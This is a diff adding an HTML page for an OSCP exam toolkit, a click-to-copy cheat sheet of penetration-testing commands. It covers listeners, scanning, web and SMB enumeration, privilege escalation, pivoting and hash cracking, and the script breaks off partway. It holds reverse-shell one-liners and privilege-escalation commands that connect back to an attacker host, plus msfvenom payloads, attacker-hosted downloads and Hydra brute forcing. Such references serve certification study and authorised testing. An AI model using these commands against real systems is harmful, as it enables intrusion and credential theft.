@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick Commands - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .config-bar {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .config-item {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        
+        .config-item label {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        
+        .config-item input {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 10px 12px;
+            color: var(--text-primary);
+            font-family: 'Cascadia Code', monospace;
+            font-size: 0.95rem;
+        }
+        
+        .config-item input:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+        }
+        
+        .cmd-section {
+            margin-bottom: 35px;
+        }
+        
+        .cmd-section h3 {
+            color: var(--accent-primary);
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 12px;
+        }
+        
+        .cmd-btn {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: left;
+        }
+        
+        .cmd-btn:hover {
+            border-color: var(--accent-primary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        
+        .cmd-btn.copied {
+            border-color: var(--accent-green);
+            background: rgba(63, 185, 80, 0.1);
+        }
+        
+        .cmd-btn .cmd-name {
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+        
+        .cmd-btn .cmd-code {
+            font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: var(--accent-cyan);
+            background: var(--bg-code);
+            padding: 8px 10px;
+            border-radius: 5px;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+        
+        .cmd-btn .cmd-hint {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            margin-top: 6px;
+        }
+        
+        .status-toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--accent-green);
+            color: var(--bg-primary);
+            padding: 15px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .status-toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .section-divider {
+            border: none;
+            border-top: 1px solid var(--border-color);
+            margin: 40px 0;
+        }
+        
+        .custom-cmd {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+        }
+        
+        .custom-cmd h3 {
+            margin-top: 0;
+        }
+        
+        .custom-cmd-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .custom-cmd-input input {
+            flex: 1;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px 15px;
+            color: var(--text-primary);
+            font-family: 'Cascadia Code', monospace;
+        }
+        
+        .custom-cmd-input button {
+            background: var(--accent-primary);
+            color: var(--bg-primary);
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .saved-cmds {
+            margin-top: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .saved-cmd-tag {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .saved-cmd-tag:hover {
+            border-color: var(--accent-primary);
+        }
+        
+        .saved-cmd-tag .remove {
+            color: var(--accent-red);
+            font-weight: bold;
+        }
+
+        .keyboard-hint {
+            background: rgba(88, 166, 255, 0.1);
+            border: 1px solid rgba(88, 166, 255, 0.3);
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 25px;
+        }
+        
+        .keyboard-hint h4 {
+            color: var(--accent-primary);
+            margin: 0 0 10px 0;
+        }
+        
+        .keyboard-hint p {
+            margin: 5px 0;
+            color: var(--text-secondary);
+        }
+        
+        .keyboard-hint kbd {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .terminal-mode {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .terminal-mode.active {
+            border-color: var(--accent-green);
+            background: rgba(63, 185, 80, 0.1);
+        }
+        
+        .terminal-mode h4 {
+            margin: 0 0 10px 0;
+            color: var(--text-primary);
+        }
+        
+        .terminal-toggle {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            width: 60px;
+            height: 30px;
+        }
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: var(--bg-tertiary);
+            transition: 0.3s;
+            border-radius: 30px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 3px;
+            bottom: 3px;
+            background-color: var(--text-muted);
+            transition: 0.3s;
+            border-radius: 50%;
+        }
+        
+        .toggle-switch input:checked + .toggle-slider {
+            background-color: var(--accent-green);
+            border-color: var(--accent-green);
+        }
+        
+        .toggle-switch input:checked + .toggle-slider:before {
+            transform: translateX(30px);
+            background-color: white;
+        }
+        
+        .terminal-status {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+        
+        .terminal-status.connected {
+            color: var(--accent-green);
+        }
+        
+        .terminal-status.error {
+            color: var(--accent-red);
+        }
+        
+        .auto-execute {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+        
+        .auto-execute input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .cmd-btn.sent {
+            border-color: var(--accent-cyan);
+            background: rgba(121, 192, 255, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>⚡ Quick Commands</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html" class="active">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="alert alert-info">
+            ⚡ <strong>Click any command to copy to clipboard!</strong> Variables like <code>{IP}</code> and <code>{PORT}</code> will be replaced with your values below.
+        </div>
+
+        <div class="keyboard-hint">
+            <h4>💡 Kali Autosuggestion Tips</h4>
+            <p><kbd>→</kbd> Right Arrow - Accept entire grey suggestion</p>
+            <p><kbd>Ctrl</kbd> + <kbd>→</kbd> - Accept next word only</p>
+            <p><kbd>End</kbd> - Accept entire suggestion</p>
+            <p><kbd>Tab</kbd> - Regular completion (files, commands)</p>
+        </div>
+
+        <div class="terminal-mode" id="terminal-mode-box">
+            <h4>🖥️ Send to Terminal</h4>
+            <div class="terminal-toggle">
+                <label class="toggle-switch">
+                    <input type="checkbox" id="terminal-mode-toggle">
+                    <span class="toggle-slider"></span>
+                </label>
+                <span class="terminal-status" id="terminal-status">Clipboard mode</span>
+                <label class="auto-execute">
+                    <input type="checkbox" id="auto-execute" checked>
+                    Auto-execute
+                </label>
+            </div>
+            <div id="terminal-controls" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: 6px;">
+                <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
+                    <button id="spawn-btn" onclick="spawnTerminal()" style="background: var(--accent-green); color: var(--bg-primary); border: none; border-radius: 6px; padding: 10px 20px; cursor: pointer; font-weight: 600; font-size: 1rem;">
+                        🖥️ Open Terminal
+                    </button>
+                    <span id="active-window-info" style="font-size: 0.9rem; color: var(--text-secondary);"></span>
+                </div>
+                <p style="margin: 10px 0 0 0; font-size: 0.8rem; color: var(--text-muted);">
+                    Opens tmux session. Commands go to your <strong>active window</strong>. Use <kbd>Ctrl+B c</kbd> for new windows.
+                </p>
+            </div>
+        </div>
+
+        <div class="config-bar">
+            <div class="config-item">
+                <label>🎯 Target IP</label>
+                <input type="text" id="target-ip" placeholder="10.10.10.100" value="">
+            </div>
+            <div class="config-item">
+                <label>🖥️ Your IP (LHOST)</label>
+                <input type="text" id="attacker-ip" placeholder="10.10.14.5" value="">
+            </div>
+            <div class="config-item">
+                <label>🔌 Listener Port</label>
+                <input type="text" id="port" placeholder="4444" value="4444">
+            </div>
+            <div class="config-item">
+                <label>👤 Username</label>
+                <input type="text" id="username" placeholder="admin" value="">
+            </div>
+            <div class="config-item">
+                <label>🔑 Password</label>
+                <input type="text" id="password" placeholder="password" value="">
+            </div>
+        </div>
+
+        <!-- LISTENERS -->
+        <div class="cmd-section">
+            <h3>🎧 Listeners</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('nc -lvnp {PORT}')">
+                    <div class="cmd-name">Netcat Listener</div>
+                    <div class="cmd-code">nc -lvnp {PORT}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('rlwrap nc -lvnp {PORT}')">
+                    <div class="cmd-name">Netcat + Readline</div>
+                    <div class="cmd-code">rlwrap nc -lvnp {PORT}</div>
+                    <div class="cmd-hint">Better shell experience</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('socat file:`tty`,raw,echo=0 TCP-L:{PORT}')">
+                    <div class="cmd-name">Socat TTY Listener</div>
+                    <div class="cmd-code">socat file:`tty`,raw,echo=0 TCP-L:{PORT}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {PORT}; run\"')">
+                    <div class="cmd-name">Metasploit Handler</div>
+                    <div class="cmd-code">msfconsole -q -x "use multi/handler..."</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FILE SERVERS -->
+        <div class="cmd-section">
+            <h3>📂 File Servers</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('python3 -m http.server 80')">
+                    <div class="cmd-name">Python HTTP Server</div>
+                    <div class="cmd-code">python3 -m http.server 80</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('python3 -m http.server 8000')">
+                    <div class="cmd-name">Python HTTP (8000)</div>
+                    <div class="cmd-code">python3 -m http.server 8000</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('impacket-smbserver share $(pwd) -smb2support')">
+                    <div class="cmd-name">SMB Server</div>
+                    <div class="cmd-code">impacket-smbserver share $(pwd) -smb2support</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('python3 -m pyftpdlib -p 21 -w')">
+                    <div class="cmd-name">FTP Server</div>
+                    <div class="cmd-code">python3 -m pyftpdlib -p 21 -w</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCANNING -->
+        <div class="cmd-section">
+            <h3>🔍 Port Scanning</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('nmap -sC -sV -oA nmap/initial {IP}')">
+                    <div class="cmd-name">Nmap Quick Scan</div>
+                    <div class="cmd-code">nmap -sC -sV -oA nmap/initial {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('nmap -p- -sC -sV -oA nmap/full {IP}')">
+                    <div class="cmd-name">Nmap Full Scan</div>
+                    <div class="cmd-code">nmap -p- -sC -sV -oA nmap/full {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('nmap -sU --top-ports 20 -oA nmap/udp {IP}')">
+                    <div class="cmd-name">Nmap UDP Scan</div>
+                    <div class="cmd-code">nmap -sU --top-ports 20 -oA nmap/udp {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('nmap --script vuln {IP}')">
+                    <div class="cmd-name">Nmap Vuln Scan</div>
+                    <div class="cmd-code">nmap --script vuln {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('rustscan -a {IP} -- -sC -sV')">
+                    <div class="cmd-name">Rustscan</div>
+                    <div class="cmd-code">rustscan -a {IP} -- -sC -sV</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WEB ENUM -->
+        <div class="cmd-section">
+            <h3>🌐 Web Enumeration</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('gobuster dir -u http://{IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt')">
+                    <div class="cmd-name">Gobuster Directory</div>
+                    <div class="cmd-code">gobuster dir -u http://{IP} -w .../common.txt -x php,html,txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('gobuster dir -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt')">
+                    <div class="cmd-name">Gobuster Raft Medium</div>
+                    <div class="cmd-code">gobuster dir -u http://{IP} -w .../raft-medium-directories.txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('feroxbuster -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt')">
+                    <div class="cmd-name">Feroxbuster</div>
+                    <div class="cmd-code">feroxbuster -u http://{IP} -w ...</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('nikto -h http://{IP}')">
+                    <div class="cmd-name">Nikto</div>
+                    <div class="cmd-code">nikto -h http://{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('whatweb http://{IP}')">
+                    <div class="cmd-name">WhatWeb</div>
+                    <div class="cmd-code">whatweb http://{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://{IP}/FUZZ')">
+                    <div class="cmd-name">Wfuzz</div>
+                    <div class="cmd-code">wfuzz -c -z file,... --hc 404 http://{IP}/FUZZ</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SMB -->
+        <div class="cmd-section">
+            <h3>📁 SMB Enumeration</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('smbclient -L //{IP} -N')">
+                    <div class="cmd-name">SMB List Shares</div>
+                    <div class="cmd-code">smbclient -L //{IP} -N</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('smbmap -H {IP}')">
+                    <div class="cmd-name">SMBMap</div>
+                    <div class="cmd-code">smbmap -H {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('enum4linux -a {IP}')">
+                    <div class="cmd-name">Enum4linux</div>
+                    <div class="cmd-code">enum4linux -a {IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('crackmapexec smb {IP} -u \"\" -p \"\" --shares')">
+                    <div class="cmd-name">CrackMapExec Null</div>
+                    <div class="cmd-code">crackmapexec smb {IP} -u "" -p "" --shares</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('nmap --script smb-vuln* -p 445 {IP}')">
+                    <div class="cmd-name">SMB Vuln Scripts</div>
+                    <div class="cmd-code">nmap --script smb-vuln* -p 445 {IP}</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REVERSE SHELLS -->
+        <div class="cmd-section">
+            <h3>🐚 Reverse Shells</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1')">
+                    <div class="cmd-name">Bash Reverse Shell</div>
+                    <div class="cmd-code">bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f')">
+                    <div class="cmd-name">Netcat mkfifo</div>
+                    <div class="cmd-code">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {PORT} >/tmp/f</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'`)">
+                    <div class="cmd-name">Python3 Reverse Shell</div>
+                    <div class="cmd-code">python3 -c 'import socket,subprocess,os;s=socket.socket...</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd(`php -r '$sock=fsockopen(\"{LHOST}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'`)">
+                    <div class="cmd-name">PHP Reverse Shell</div>
+                    <div class="cmd-code">php -r '$sock=fsockopen("{LHOST}",{PORT});exec...'</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SHELL UPGRADE -->
+        <div class="cmd-section">
+            <h3>⬆️ Shell Upgrade</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd(`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`)">
+                    <div class="cmd-name">Python PTY Spawn</div>
+                    <div class="cmd-code">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('script /dev/null -c bash')">
+                    <div class="cmd-name">Script PTY</div>
+                    <div class="cmd-code">script /dev/null -c bash</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('stty raw -echo; fg')">
+                    <div class="cmd-name">Stty Raw (after Ctrl+Z)</div>
+                    <div class="cmd-code">stty raw -echo; fg</div>
+                    <div class="cmd-hint">Run after Ctrl+Z in your terminal</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('export TERM=xterm-256color')">
+                    <div class="cmd-name">Export TERM</div>
+                    <div class="cmd-code">export TERM=xterm-256color</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FILE TRANSFER -->
+        <div class="cmd-section">
+            <h3>📤 File Transfer</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('wget http://{LHOST}/linpeas.sh')">
+                    <div class="cmd-name">Wget Download</div>
+                    <div class="cmd-code">wget http://{LHOST}/linpeas.sh</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('curl http://{LHOST}/file -o file')">
+                    <div class="cmd-name">Curl Download</div>
+                    <div class="cmd-code">curl http://{LHOST}/file -o file</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('certutil.exe -urlcache -split -f http://{LHOST}/file.exe file.exe')">
+                    <div class="cmd-name">Certutil (Windows)</div>
+                    <div class="cmd-code">certutil.exe -urlcache -split -f http://{LHOST}/file.exe file.exe</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd(`powershell -c "(New-Object Net.WebClient).DownloadFile('http://{LHOST}/file.exe','file.exe')"`)">
+                    <div class="cmd-name">PowerShell Download</div>
+                    <div class="cmd-code">powershell -c "(New-Object Net.WebClient).DownloadFile..."</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('copy \\\\{LHOST}\\share\\file.exe .')">
+                    <div class="cmd-name">SMB Copy (Windows)</div>
+                    <div class="cmd-code">copy \\{LHOST}\share\file.exe .</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LINUX PRIVESC -->
+        <div class="cmd-section">
+            <h3>🐧 Linux PrivEsc</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('sudo -l')">
+                    <div class="cmd-name">Check Sudo</div>
+                    <div class="cmd-code">sudo -l</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('find / -perm -4000 -type f 2>/dev/null')">
+                    <div class="cmd-name">Find SUID</div>
+                    <div class="cmd-code">find / -perm -4000 -type f 2>/dev/null</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('getcap -r / 2>/dev/null')">
+                    <div class="cmd-name">Find Capabilities</div>
+                    <div class="cmd-code">getcap -r / 2>/dev/null</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('cat /etc/crontab')">
+                    <div class="cmd-name">View Crontab</div>
+                    <div class="cmd-code">cat /etc/crontab</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('./linpeas.sh | tee linpeas.txt')">
+                    <div class="cmd-name">Run LinPEAS</div>
+                    <div class="cmd-code">./linpeas.sh | tee linpeas.txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('./pspy64')">
+                    <div class="cmd-name">Run pspy</div>
+                    <div class="cmd-code">./pspy64</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WINDOWS PRIVESC -->
+        <div class="cmd-section">
+            <h3>🪟 Windows PrivEsc</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('whoami /priv')">
+                    <div class="cmd-name">Check Privileges</div>
+                    <div class="cmd-code">whoami /priv</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('whoami /groups')">
+                    <div class="cmd-name">Check Groups</div>
+                    <div class="cmd-code">whoami /groups</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('.\\winPEASx64.exe')">
+                    <div class="cmd-name">Run WinPEAS</div>
+                    <div class="cmd-code">.\\winPEASx64.exe</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('.\\PrintSpoofer64.exe -c \"nc.exe {LHOST} {PORT} -e cmd\"')">
+                    <div class="cmd-name">PrintSpoofer</div>
+                    <div class="cmd-code">.\\PrintSpoofer64.exe -c "nc.exe {LHOST} {PORT} -e cmd"</div>
+                    <div class="cmd-hint">Requires SeImpersonate</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('.\\GodPotato-NET4.exe -cmd \"nc.exe {LHOST} {PORT} -e cmd\"')">
+                    <div class="cmd-name">GodPotato</div>
+                    <div class="cmd-code">.\\GodPotato-NET4.exe -cmd "nc.exe {LHOST} {PORT} -e cmd"</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"')">
+                    <div class="cmd-name">AutoLogon Creds</div>
+                    <div class="cmd-code">reg query "HKLM\...\Winlogon"</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- MSFVENOM -->
+        <div class="cmd-section">
+            <h3>🎯 Msfvenom Payloads</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f elf > shell.elf')">
+                    <div class="cmd-name">Linux ELF</div>
+                    <div class="cmd-code">msfvenom -p linux/x64/shell_reverse_tcp ... -f elf > shell.elf</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f exe > shell.exe')">
+                    <div class="cmd-name">Windows EXE</div>
+                    <div class="cmd-code">msfvenom -p windows/x64/shell_reverse_tcp ... -f exe > shell.exe</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('msfvenom -p php/reverse_php LHOST={LHOST} LPORT={PORT} -f raw > shell.php')">
+                    <div class="cmd-name">PHP Shell</div>
+                    <div class="cmd-code">msfvenom -p php/reverse_php ... -f raw > shell.php</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={PORT} -f war > shell.war')">
+                    <div class="cmd-name">WAR Shell</div>
+                    <div class="cmd-code">msfvenom -p java/jsp_shell_reverse_tcp ... -f war > shell.war</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PIVOTING -->
+        <div class="cmd-section">
+            <h3>🔀 Pivoting</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('./chisel server -p 8080 --reverse')">
+                    <div class="cmd-name">Chisel Server</div>
+                    <div class="cmd-code">./chisel server -p 8080 --reverse</div>
+                    <div class="cmd-hint">Run on attacker</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('./chisel client {LHOST}:8080 R:socks')">
+                    <div class="cmd-name">Chisel Client SOCKS</div>
+                    <div class="cmd-code">./chisel client {LHOST}:8080 R:socks</div>
+                    <div class="cmd-hint">Run on pivot</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('ssh -D 9050 -N {USER}@{IP}')">
+                    <div class="cmd-name">SSH SOCKS Proxy</div>
+                    <div class="cmd-code">ssh -D 9050 -N {USER}@{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('proxychains nmap -sT -Pn {IP}')">
+                    <div class="cmd-name">Proxychains Nmap</div>
+                    <div class="cmd-code">proxychains nmap -sT -Pn {IP}</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CONNECTIONS -->
+        <div class="cmd-section">
+            <h3>🔗 Remote Connections</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('evil-winrm -i {IP} -u {USER} -p {PASS}')">
+                    <div class="cmd-name">Evil-WinRM</div>
+                    <div class="cmd-code">evil-winrm -i {IP} -u {USER} -p {PASS}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('psexec.py {USER}:{PASS}@{IP}')">
+                    <div class="cmd-name">PSExec</div>
+                    <div class="cmd-code">psexec.py {USER}:{PASS}@{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('wmiexec.py {USER}:{PASS}@{IP}')">
+                    <div class="cmd-name">WMIExec</div>
+                    <div class="cmd-code">wmiexec.py {USER}:{PASS}@{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('xfreerdp /v:{IP} /u:{USER} /p:{PASS}')">
+                    <div class="cmd-name">RDP (xfreerdp)</div>
+                    <div class="cmd-code">xfreerdp /v:{IP} /u:{USER} /p:{PASS}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('ssh {USER}@{IP}')">
+                    <div class="cmd-name">SSH</div>
+                    <div class="cmd-code">ssh {USER}@{IP}</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('mssqlclient.py {USER}:{PASS}@{IP} -windows-auth')">
+                    <div class="cmd-name">MSSQL Client</div>
+                    <div class="cmd-code">mssqlclient.py {USER}:{PASS}@{IP} -windows-auth</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- HASHES -->
+        <div class="cmd-section">
+            <h3>🔐 Password & Hashes</h3>
+            <div class="cmd-grid">
+                <div class="cmd-btn" onclick="copyCmd('hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt')">
+                    <div class="cmd-name">Hashcat MD5</div>
+                    <div class="cmd-code">hashcat -m 0 hash.txt rockyou.txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt')">
+                    <div class="cmd-name">Hashcat NTLM</div>
+                    <div class="cmd-code">hashcat -m 1000 hash.txt rockyou.txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt')">
+                    <div class="cmd-name">John the Ripper</div>
+                    <div class="cmd-code">john --wordlist=rockyou.txt hash.txt</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('openssl passwd -1 password')">
+                    <div class="cmd-name">Generate MD5 Hash</div>
+                    <div class="cmd-code">openssl passwd -1 password</div>
+                </div>
+                <div class="cmd-btn" onclick="copyCmd('hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} ssh')">
+                    <div class="cmd-name">Hydra SSH</div>
+                    <div class="cmd-code">hydra -l {USER} -P rockyou.txt {IP} ssh</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CUSTOM COMMANDS -->
+        <div class="custom-cmd">
+            <h3>💾 Your Custom Commands</h3>
+            <p style="color: var(--text-secondary); font-size: 0.9rem;">Save frequently used commands here. They persist in your browser.</p>
+            <div class="custom-cmd-input">
+                <input type="text" id="custom-cmd-input" placeholder="Enter command to save...">
+                <button onclick="saveCustomCmd()">Save</button>
+            </div>
+            <div class="saved-cmds" id="saved-cmds"></div>
+        </div>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <div class="status-toast" id="toast">Copied to clipboard!</div>
+
+    <script>
+        // Use same origin (works when served by START script)
+        const API_BASE = window.location.origin;
+        
+        // Load saved values
+        document.getElementById('target-ip').value = localStorage.getItem('target-ip') || '';
+        document.getElementById('attacker-ip').value = localStorage.getItem('attacker-ip') || '';
+        document.getElementById('port').value = localStorage.getItem('port') || '4444';
